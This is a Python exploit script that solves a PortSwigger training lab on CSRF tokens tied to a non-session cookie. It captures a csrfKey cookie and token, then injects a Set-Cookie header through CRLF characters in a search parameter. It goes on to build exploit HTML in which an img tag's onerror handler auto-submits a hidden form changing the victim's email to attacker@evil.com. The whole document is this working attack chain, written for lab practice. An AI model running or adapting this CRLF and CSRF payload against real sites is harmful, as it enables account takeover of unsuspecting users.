# Lab 05 — CSRF where token is tied to non-session cookie
# PortSwigger: https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie
#
# Vulnerability: CSRF token tied to csrfKey cookie (not session cookie)
#                + search parameter is vulnerable to CRLF / cookie injection
# Aim:           Inject your own csrfKey cookie into the victim's browser,
#                then submit your matching token
#
# Technique:
#   App uses two cookies: session (auth) and csrfKey (CSRF binding).
#   Token in form is tied to csrfKey, not session.
#
#   Attack chain:
#     1. Log in as wiener → get csrfKey cookie value and matching csrf token
#     2. Inject csrfKey=ATTACKER_VALUE into victim's browser via CRLF injection
#        in the search parameter (search input is reflected in Set-Cookie header)
#     3. Exploit form uses matching csrf token → validation passes
#
#   CRLF injection: %0d%0a in the search param inserts a newline into the
#   HTTP response header, allowing injection of a Set-Cookie header.
#   📝 CRLF = Carriage Return + Line Feed (\r\n). HTTP headers are separated
#      by CRLF pairs, so injecting one lets you start a new header.
#
# Usage: python csrf_lab05.py <url>

import sys
import urllib3
from proxies import proxies
from csrf_utils import (banner, section, make_session, login,
                        get_account_page, get_csrf_from_response,
                        print_box, print_exploit_steps)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

VICTIM_EMAIL = "attacker@evil.com"

if __name__ == "__main__":
    banner()
    section("LAB 05 — CSRF: TOKEN TIED TO NON-SESSION COOKIE (CRLF BYPASS)")

    if len(sys.argv) != 2:
        print("  Usage: python csrf_lab05.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    # ── Step 1: log in, grab csrfKey cookie and matching token ───────────────
    print("\n  ── Step 1: capture attacker's csrfKey and matching csrf token\n")
    if not login(session, url):
        sys.exit(1)

    r = get_account_page(session, url)
    csrf_token = get_csrf_from_response(r.text)
    csrf_key   = session.cookies.get("csrfKey")

    if not csrf_token or not csrf_key:
        print("  ✘  Could not capture csrfKey or csrf token — check the lab manually")
        sys.exit(1)

    print(f"  ✔  csrfKey cookie : {csrf_key}")
    print(f"  ✔  Matching token : {csrf_token}\n")

    # ── Step 2: confirm CRLF injection in search ─────────────────────────────
    print("  ── Step 2: confirm search param is vulnerable to CRLF injection\n")
    test_r = session.get(
        f"{url}/?search=test%0d%0aSet-Cookie:+csrfKey=test123%3b+SameSite=None"
    )
    if "csrfKey=test123" in test_r.headers.get("Set-Cookie", ""):
        print("  ✔  CRLF injection confirmed — Set-Cookie header injected")
    else:
        print("  ?  CRLF injection not visible in direct response headers")
        print("     (May only work in browser context — proceed with exploit)\n")

    # ── Step 3: build the chained exploit ────────────────────────────────────
    section("Step 3: Exploit HTML for the exploit server")

    # The img src fires the CRLF injection, setting csrfKey in the victim's browser.
    # onerror fires after the img request completes, then submits the form.
    crlf_url = (f"{url}/?search=x%0d%0aSet-Cookie:+csrfKey={csrf_key}%3b+SameSite=None")

    exploit = f"""\
<img src="{crlf_url}" onerror="document.forms[0].submit()">

<form method="POST" action="{url}/my-account/change-email">
    <input type="hidden" name="email" value="{VICTIM_EMAIL}">
    <input type="hidden" name="csrf" value="{csrf_token}">
</form>"""

    print_box("EXPLOIT SERVER BODY", exploit)
    print_exploit_steps()
    print()
    print("  ℹ  Attack flow:")
    print("     1. img src fires → GET to target with CRLF payload")
    print("        → response sets csrfKey=attacker's value in victim's browser")
    print("     2. img fails to load (onerror) → form submits")
    print("        → csrf token matches injected csrfKey → validation passes")
    print("     ⚠  The victim's session cookie is untouched — we only replaced csrfKey.")
